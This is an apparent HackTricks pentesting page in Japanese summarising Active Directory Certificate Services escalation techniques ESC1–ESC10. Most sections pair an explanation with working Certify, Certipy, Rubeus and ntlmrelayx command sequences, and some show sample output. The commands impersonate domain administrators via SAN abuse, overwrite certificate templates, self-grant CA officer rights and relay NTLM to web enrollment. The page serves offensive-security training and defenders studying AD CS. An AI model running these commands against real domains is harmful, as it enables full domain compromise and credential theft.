# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**これは、以下の投稿における escalation technique セクションの概要です:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

- **Enterprise CA によって、低権限ユーザーに Enrolment 権限が付与されている。**
- **Manager approval は必要ない。**
- **認証された担当者による署名は必要ない。**
- **Certificate template の security descriptor が過度に寛容であり、低権限ユーザーが Enrolment 権限を取得できる。**
- **Certificate template が、authentication を容易にする EKU を定義するよう設定されている:**
- Client Authentication (OID 1.3.6.1.5.5.7.3.2)、PKINIT Client Authentication (1.3.6.1.5.2.3.4)、Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2)、Any Purpose (OID 2.5.29.37.0)、または EKU なし (SubCA) などの Extended Key Usage (EKU) identifier が含まれている。
- **Certificate Signing Request (CSR) に subjectAltName を含めることが requester に許可されている:**
- Active Directory (AD) は、証明書に subjectAltName (SAN) が存在する場合、identity verification において SAN を優先する。つまり、CSR で SAN を指定することで、任意のユーザー (例: domain administrator) になりすますための証明書を要求できる。requester が SAN を指定できるかどうかは、certificate template の AD object にある `mspki-certificate-name-flag` property で示される。この property は bitmask であり、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag が存在すると、requester による SAN の指定が許可される。

> [!CAUTION]
> この設定により、低権限ユーザーは任意の SAN を持つ証明書を要求でき、Kerberos または SChannel を介して任意の domain principal として authentication できる。

この機能は、products や deployment services による HTTPS または host certificate の on-the-fly 生成をサポートするため、あるいは理解不足が原因で、有効化されることがある。

このオプションを使用して証明書を作成すると warning が表示される。ただし、既存の certificate template (例: `WebServer` template。この template では `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` が有効になっている) を duplicate し、authentication OID を含めるよう変更した場合には、この warning は表示されない。

### Abuse

**vulnerable certificate templates** を見つけるには、次を実行します:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**この脆弱性を悪用して管理者になりすますには**、次を実行します:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
その後、生成された **certificate を `.pfx`** 形式に変換し、それを使用して **Rubeus または certipy で再度 authenticate** できます：
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows バイナリの「Certreq.exe」と「Certutil.exe」を使用して PFX を生成できます: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest の構成スキーマ内にある証明書テンプレートの列挙は、特に承認や署名を必要とせず、Client Authentication または Smart Card Logon EKU を持ち、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` フラグが有効になっているものを対象として、次の LDAP query を実行することで行えます:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### Explanation

2つ目のabuse scenarioは、最初のもののvariationです。

1. Enrollment rightsがEnterprise CAによってlow-privileged usersに付与されている。
2. manager approvalの要件が無効化されている。
3. authorized signaturesの必要性が省略されている。
4. certificate template上の過度に permissive なsecurity descriptorにより、low-privileged usersにcertificate enrollment rightsが付与されている。
5. **certificate templateにAny Purpose EKU、またはEKUなしが定義されている。**

**Any Purpose EKU**により、attackerはclient authentication、server authentication、code signingなど、**あらゆる目的**で使用できるcertificateを取得できます。このscenarioのexploitには、**ESC3で使用したtechnique**と同じものを利用できます。

**EKUなし**のcertificatesはsubordinate CA certificatesとして機能し、**あらゆる目的**で悪用でき、**新しいcertificatesのsigningにも使用できます**。したがって、attackerはsubordinate CA certificateを利用して、新しいcertificatesに任意のEKUやfieldsを指定できます。

ただし、subordinate CAが**`NTAuthCertificates`** objectから信頼されていない場合（これがdefault setting）、**domain authentication**用に作成された新しいcertificatesは機能しません。それでもattackerは、**任意のEKU**と任意のcertificate valuesを持つ**新しいcertificatesを作成**できます。これらは、code signing、server authenticationなど、幅広い目的で**悪用される可能性**があり、SAML、AD FS、IPSecなど、network上の他のapplicationsにも重大な影響を及ぼす可能性があります。

AD Forestのconfiguration schema内でこのscenarioに一致するtemplatesをenumerateするには、次のLDAP queryを実行できます。
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Explanation

このシナリオは最初と2番目のシナリオに似ていますが、**異なる EKU**（Certificate Request Agent）と**2つの異なるテンプレート**（そのため要件も2セット）を**悪用**します。

**Certificate Request Agent EKU**（OID 1.3.6.1.4.1.311.20.2.1）は、Microsoft のドキュメントでは **Enrollment Agent** と呼ばれており、プリンシパルが**別のユーザーに代わって****証明書**を**enroll**できるようにします。

**「enrollment agent」**はこのような**テンプレート**に**enroll**し、取得した**証明書を使用して、他のユーザーに代わって CSR に co-sign**します。その後、**co-sign された CSR**を CA に送信し、**「enroll on behalf of」**を許可する**テンプレート**に**enroll**します。CA は**「他の」ユーザーに属する証明書**を返します。

**Requirements 1:**

- Enterprise CA により、低権限ユーザーに enrollment 権限が付与されている。
- manager approval の要件が省略されている。
- authorized signatures の要件がない。
- 証明書テンプレートの security descriptor が過度に permissive で、低権限ユーザーに enrollment 権限を付与している。
- 証明書テンプレートに Certificate Request Agent EKU が含まれており、他のプリンシパルに代わって他の証明書テンプレートを request できる。

**Requirements 2:**

- Enterprise CA が低権限ユーザーに enrollment 権限を付与している。
- manager approval が bypass されている。
- テンプレートの schema version が 1 または 2 を超えており、Certificate Request Agent EKU を必要とする Application Policy Issuance Requirement が指定されている。
- 証明書テンプレートで定義された EKU により、domain authentication が許可されている。
- CA で enrollment agents に対する制限が適用されていない。

### Abuse

このシナリオを悪用するには、[**Certify**](https://github.com/GhostPack/Certify) または [**Certipy**](https://github.com/ly4k/Certipy) を使用できます。
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**enrollment agent certificate**を**取得**できる**users**、**agents**がenrollを許可されるテンプレート、およびenrollment agentが代理として操作できる**accounts**は、enterprise CAによって制限できます。これは、`certsrc.msc` **snap-in**を開き、**CAを右クリック**して**Propertiesをクリック**し、「Enrollment Agents」タブに**移動**することで設定できます。

ただし、CAの**default**設定は「**Do not restrict enrollment agents**」である点に注意が必要です。管理者がenrollment agentsの制限を有効化し、「Restrict enrollment agents」に設定した場合でも、default configurationは依然として非常に緩 permissive です。これにより、**Everyone**がすべてのテンプレートへのenrollを、誰としてでも実行できます。

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

**certificate templates**上の**security descriptor**は、そのテンプレートに関して特定の**AD principals**が保有する**permissions**を定義します。

**attacker**が**template**を**alter**し、**prior sections**で説明した**exploitable misconfigurations**を**institute**するために必要な**permissions**を保有している場合、privilege escalationが可能になります。

certificate templatesに適用される主なpermissionsは以下のとおりです。

- **Owner:** オブジェクトに対する暗黙的なcontrolを付与し、任意の属性を変更できるようにします。
- **FullControl:** 任意の属性を変更する機能を含め、オブジェクトに対する完全な権限を付与します。
- **WriteOwner:** オブジェクトのownerを、attackerがcontrolするprincipalに変更できます。
- **WriteDacl:** access controlsを変更でき、attackerにFullControlを付与することも可能です。
- **WriteProperty:** 任意のオブジェクトプロパティを編集できます。

### Abuse

テンプレートおよびその他のPKIオブジェクトに対する編集権限を持つprincipalsを特定するには、Certifyでenumerateします。
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
前の例と同様の privesc の例です。

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 は、ユーザーが certificate template に対する書き込み権限を持っている状態です。これは、certificate template の設定を上書きして、template を ESC1 に対して脆弱にするために悪用できます。

上のパスからわかるように、これらの権限を持っているのは `JOHNPC` だけですが、ユーザー `JOHN` には `JOHNPC` への新しい `AddKeyCredentialLink` edge があります。この technique は certificates に関連しているため、この攻撃も実装しました。これは [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) と呼ばれています。ここでは、被害者の NT hash を取得する Certipy の `shadow auto` command を少し紹介します。
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** は、1つのコマンドで certificate template の設定を上書きできます。**デフォルト**では、Certipy は設定を上書きし、**ESC1 に対して脆弱**な状態にします。また、**`-save-old` パラメーターを指定して以前の設定を保存**することもできます。これは、攻撃後に設定を**復元**する際に役立ちます。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## 脆弱な PKI Object Access Control - ESC5

### Explanation

Certificate template と certification authority 以外の複数のオブジェクトを含む、相互に接続された ACL ベースの関係の広範なネットワークは、AD CS システム全体の security に影響を与える可能性があります。security に大きな影響を与えるこれらのオブジェクトには、以下が含まれます。

- S4U2Self や S4U2Proxy などのメカニズムを通じて compromise される可能性がある、CA server の AD computer object。
- CA server の RPC/DCOM server。
- 特定の container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 内にある、任意の descendant AD object または container。この path には、Certificate Templates container、Certification Authorities container、NTAuthCertificates object、Enrollment Services Container などの container および object が含まれますが、これらに限定されません。

低権限の attacker がこれらの重要な component のいずれかを control できた場合、PKI system の security が compromise される可能性があります。

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) で説明されている内容では、Microsoft が概説している **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag の影響についても扱われています。この configuration を Certification Authority (CA) で有効にすると、Active Directory® から構築された request を含む **any request** に、**user-defined values** を **subject alternative name** として含めることができます。その結果、この設定により、**intruder** は domain **authentication** 用に設定された **any template**、つまり標準の User template のように **unprivileged** user による enrollment を許可している template を通じて enrollment できます。これにより、certificate を取得し、intruder が domain administrator または domain 内の **any other active entity** として authenticate できるようになります。

**Note**: `certreq.exe` の `-attrib "SAN:"` argument（“Name Value Pairs” と呼ばれます）を使用して Certificate Signing Request (CSR) に **alternative names** を追加する方法は、ESC1 における SAN の exploitation strategy とは異なります。ここでの違いは、account information の encapsulation 方法にあります。つまり、extension 内ではなく certificate attribute 内に encapsulate されます。

### Abuse

設定が有効かどうかを確認するには、以下の `certutil.exe` command を使用できます。
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
この操作は基本的に **remote registry access** を利用するため、別のアプローチとしては次のようなものが考えられます:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) や [**Certipy**](https://github.com/ly4k/Certipy) などのツールは、この設定ミスを検出して悪用できます:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
これらの設定を変更するには、**domain administrative** 権限または同等の権限があれば、以下のコマンドを任意のワークステーションから実行できます。
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
この設定を環境で無効化するには、次のコマンドでフラグを削除できます。
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> 2022年5月のsecurity updates後に新しく発行された**certificates**には、**requesterの`objectSid` property**を組み込んだ**security extension**が含まれます。ESC1では、このSIDは指定されたSANから導出されます。ただし、**ESC6**では、SIDはSANではなく**requesterの`objectSid`**を反映します。\
> ESC6をexploitするには、**SANよりも新しいsecurity extensionを優先する**ESC10（Weak Certificate Mappings）の影響を受けやすいシステムであることが不可欠です。

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Certificate Authorityのアクセス制御は、CAのアクションを管理する一連のpermissionによって維持されます。これらのpermissionは、`certsrv.msc`にアクセスし、CAを右クリックしてPropertiesを選択し、Securityタブに移動することで確認できます。さらに、次のようなコマンドを使用してPSPKI moduleでpermissionをenumerateできます:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
これは、主な権限である **`ManageCA`** と **`ManageCertificates`** に関する情報を提供します。これらはそれぞれ「CA administrator」と「Certificate Manager」の役割に対応します。

#### Abuse

証明機関に対する **`ManageCA`** 権限を持つ principal は、PSPKI を使用してリモートから設定を操作できます。これには、任意の template で SAN の指定を許可する **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag の切り替えが含まれ、domain escalation における重要な要素となります。

このプロセスは、PSPKI の **Enable-PolicyModuleFlag** cmdlet を使用することで簡略化でき、GUI を直接操作せずに変更できます。

**`ManageCertificates`** 権限を持っていると、保留中の request を承認でき、「CA certificate manager approval」保護機能を事実上回避できます。

**Certify** と **PSPKI** modules を組み合わせることで、certificate の request、承認、download を実行できます。
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

> [!WARNING]
> **previous attack** では、**`Manage CA`** 権限を使用して **EDITF_ATTRIBUTESUBJECTALTNAME2** フラグを **有効化** し、**ESC6 attack** を実行しましたが、CA service（`CertSvc`）を再起動するまで効果はありません。ユーザーが `Manage CA` access right を持っている場合、そのユーザーには **service を再起動する権限** も与えられます。ただし、これは **ユーザーが service をリモートから再起動できる** ことを意味しません。さらに、2022 年 5 月の security updates により、ほとんどの patched environments では **E**SC6 が **out of the box で動作しない可能性があります**。

したがって、ここでは別の attack を紹介します。

前提条件：

- **`ManageCA` permission** のみ
- **`Manage Certificates`** permission（**`ManageCA`** から付与可能）
- Certificate template **`SubCA`** が **enabled** であること（**`ManageCA`** から有効化可能）

この technique は、`Manage CA` _and_ `Manage Certificates` access right を持つユーザーが、**失敗した certificate request を発行できる** という事実を利用します。**`SubCA`** certificate template は **ESC1 に対して vulnerable** ですが、template に enroll できるのは **administrators のみ** です。そのため、**user** は **`SubCA`** への enroll を **request** できます。この request は **denied** されますが、**その後 manager によって発行されます**。

#### Abuse

新しい officer として自分の user を追加することで、**自分自身に `Manage Certificates`** access right を **grant** できます。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** templateは、`-enable-template` parameterを使用して**CA**上で**enabled**にできます。デフォルトでは、`SubCA` templateはenabledです。
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
この攻撃の前提条件を満たしている場合、まず **`SubCA` template に基づく証明書を要求**できます。

**この要求は拒否され**ます**が、秘密鍵を保存し、要求 ID を記録します。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA` と `Manage Certificates` を使用すると、`ca` コマンドと `-issue-request <request ID>` パラメーターで、失敗した **certificate** リクエストを発行できます。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
最後に、`req` コマンドと `-retrieve <request ID>` パラメーターを使用して、**発行された証明書を取得**できます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### 解説

従来の ESC7 の悪用（EDITF 属性の有効化や保留中のリクエストの承認）に加えて、**Certify 2.0** により、Enterprise CA 上の *Manage Certificates*（別名 **Certificate Manager / Officer**）ロールだけを必要とする、まったく新しい primitive が明らかになりました。

`ICertAdmin::SetExtension` RPC メソッドは、*Manage Certificates* を保有する任意の principal によって実行できます。このメソッドは従来、正規の CA が **pending** リクエストの extension を更新するために使用していました。しかし攻撃者はこれを悪用し、承認待ちのリクエストに対して、*non-default* の certificate extension（例：`1.1.1.1` のようなカスタム *Certificate Issuance Policy* OID）を**追加**できます。

対象の template がその extension のデフォルト値を定義していない場合、リクエストが最終的に発行されても、CA は攻撃者が制御する値を上書きしません。そのため、生成された certificate には攻撃者が選択した extension が含まれ、以下の用途に利用できます。

* 他の脆弱な template の Application / Issuance Policy 要件を満たす（privilege escalation につながる）。
* 追加の EKU や policy を注入し、third-party system で certificate に予期しない trust を付与する。

要するに、従来は ESC7 の「より強力でない」側と考えられていた *Manage Certificates* を、CA configuration に触れることなく、またより制限された *Manage CA* 権限を必要とせずに、完全な privilege escalation や長期的な persistence に利用できるようになりました。

#### Certify 2.0 による primitive の悪用

1. ***pending* のまま残る certificate request を送信します。** manager approval を必要とする template を使用することで、これを強制できます。
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. 新しい `manage-ca` command を使用して、pending request に custom extension を**追加**します。
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*template がすでに *Certificate Issuance Policies* extension を定義していない場合、上記の値は発行後も保持されます。*

3. （自身の role に *Manage Certificates* の承認権限もある場合は）request を**発行**するか、operator が承認するまで待ちます。発行されたら certificate をダウンロードします。
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. 生成された certificate には悪意のある issuance-policy OID が含まれるため、後続の攻撃（例：ESC13、domain escalation など）に使用できます。

> NOTE: 同じ攻撃は、`ca` command と `-set-extension` parameter を使用して Certipy ≥ 4.7 でも実行できます。

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### 解説

> [!TIP]
> **AD CS がインストールされている**環境で、**脆弱な web enrollment endpoint が存在**し、さらに少なくとも 1 つの **certificate template が公開**されていて、**domain computer enrollment と client authentication を許可**している場合（デフォルトの **`Machine`** template など）、**spooler service が有効な任意の computer を攻撃者が compromise できるようになります**。

AD CS は複数の **HTTP-based enrollment method** をサポートしており、管理者がインストールできる追加の server role を通じて提供されます。HTTP-based certificate enrollment 用のこれらの interface は、**NTLM relay attack** の影響を受けます。攻撃者は、**compromised machine から、inbound NTLM によって認証する任意の AD account を impersonate できます**。victim account を impersonate している間、攻撃者はこれらの web interface にアクセスし、`User` または `Machine` certificate template を使用して client authentication certificate を要求できます。

- **web enrollment interface**（`http://<caserver>/certsrv/` で利用できる古い ASP application）は、デフォルトで HTTP のみを使用するため、NTLM relay attack に対する保護を提供しません。さらに、Authorization HTTP header を通じた NTLM authentication のみを明示的に許可しているため、Kerberos などのより安全な authentication method は適用できません。
- **Certificate Enrollment Service**（CES）、**Certificate Enrollment Policy**（CEP）Web Service、**Network Device Enrollment Service**（NDES）は、デフォルトで Authorization HTTP header を介した negotiate authentication をサポートします。Negotiate authentication は Kerberos と **NTLM** の両方をサポートするため、攻撃者は relay attack 中に authentication を **NTLM に downgrade** できます。これらの web service はデフォルトで HTTPS を有効にしますが、HTTPS だけでは NTLM relay attack から保護できません。HTTPS service を NTLM relay attack から保護するには、HTTPS と channel binding を組み合わせる必要があります。残念ながら、AD CS は IIS 上で Extended Protection for Authentication を有効化しません。これは channel binding に必要です。

NTLM relay attack における一般的な **issue** は、NTLM session の**短い持続時間**と、NTLM signing を**要求する**service と攻撃者がやり取りできないことです。

それでも、certificate の有効期間が session の持続時間を決定し、その certificate を NTLM signing を**必須とする**service で使用できるため、NTLM relay attack を利用して user の certificate を取得することで、この制限を回避できます。盗んだ certificate の使用方法については、以下を参照してください。


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attack のもう 1 つの制限は、**attacker-controlled machine が victim account によって authentication される必要がある**ことです。攻撃者は、認証が発生するのを待つか、次の方法でこの authentication を**強制**できます。


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **悪用**

[**Certify**](https://github.com/GhostPack/Certify) の `cas` は、**有効な HTTP AD CS endpoint** を列挙します。
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers`プロパティは、enterprise Certificate Authorities (CAs)がCertificate Enrollment Service (CES)のエンドポイントを格納するために使用します。これらのエンドポイントは、**Certutil.exe**を使用して解析および一覧表示できます。
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certifyによる悪用
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) による Abuse

証明書のリクエストは、デフォルトで Certipy によって `Machine` または `User` template に基づいて実行されます。これは、relay されるアカウント名が `$` で終わるかどうかによって決まります。別の template を指定するには、`-template` パラメーターを使用します。

その後、[PetitPotam](https://github.com/ly4k/PetitPotam) のような technique を使用して、認証を強制できます。domain controllers を対象とする場合は、`-template DomainController` の指定が必要です。
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explanation

**`msPKI-Enrollment-Flag`** の新しい値 **`CT_FLAG_NO_SECURITY_EXTENSION`**（`0x80000`）は、ESC9 と呼ばれ、証明書に **新しい `szOID_NTDS_CA_SECURITY_EXT` security extension** が埋め込まれるのを防ぎます。このフラグは、**`StrongCertificateBindingEnforcement`** が `1`（デフォルト設定）に設定されている場合に関係します。これは、`2` に設定されている場合とは異なります。Kerberos または Schannel のより弱い証明書マッピングが悪用される可能性があるシナリオ（ESC10 など）では、このフラグの重要性が高まります。ESC9 がなければ、要件は変わりません。

このフラグの設定が重要になる条件は、次のとおりです。

- `StrongCertificateBindingEnforcement` が `2` に変更されていない（デフォルトは `1`）、または `CertificateMappingMethods` に `UPN` フラグが含まれている。
- 証明書の `msPKI-Enrollment-Flag` 設定で、`CT_FLAG_NO_SECURITY_EXTENSION` フラグが指定されている。
- 証明書にクライアント認証 EKU が指定されている。
- 別のアカウントを compromise するために、いずれかのアカウントに対する `GenericWrite` 権限が利用できる。

### Abuse Scenario

`John@corp.local` が `Jane@corp.local` に対する `GenericWrite` 権限を持っており、`Administrator@corp.local` を compromise することを目的としているとします。`Jane@corp.local` に enroll が許可されている `ESC9` certificate template は、`msPKI-Enrollment-Flag` 設定で `CT_FLAG_NO_SECURITY_EXTENSION` フラグが有効になっています。

まず、`John` の `GenericWrite` を利用した Shadow Credentials によって、`Jane` の hash を取得します。
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
その後、`Jane` の `userPrincipalName` は、意図的に `@corp.local` ドメイン部分を省略して `Administrator` に変更されます：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
この変更は、`Administrator@corp.local` が引き続き `Administrator` の `userPrincipalName` として別個に維持されるため、制約に違反しません。

続いて、脆弱性のある `ESC9` certificate template を `Jane` として要求します：
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
証明書の `userPrincipalName` には `Administrator` が反映されており、“object SID” は含まれていないことに注目してください。

その後、`Jane` の `userPrincipalName` は元の `Jane@corp.local` に戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
発行された証明書で認証を試行すると、`Administrator@corp.local` の NT hash が取得されます。証明書に domain の指定がないため、コマンドには `-domain <domain>` を含める必要があります：
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### Explanation

ドメインコントローラー上の2つのレジストリキーの値がESC10に関連します。

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 配下の `CertificateMappingMethods` のデフォルト値は `0x18`（`0x8 | 0x10`）で、以前は `0x1F` に設定されていました。
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 配下の `StrongCertificateBindingEnforcement` のデフォルト設定は `1` で、以前は `0` でした。

**Case 1**

`StrongCertificateBindingEnforcement` が `0` に設定されている場合。

**Case 2**

`CertificateMappingMethods` に `UPN` bit（`0x4`）が含まれている場合。

### Abuse Case 1

`StrongCertificateBindingEnforcement` が `0` に設定されている場合、アカウントAが `GenericWrite` 権限を持っていれば、任意のアカウントBを侵害できます。

たとえば、`Jane@corp.local` に対する `GenericWrite` 権限を持つ攻撃者が、`Administrator@corp.local` の侵害を目指すケースです。この手順はESC9と同様で、任意のcertificate templateを使用できます。

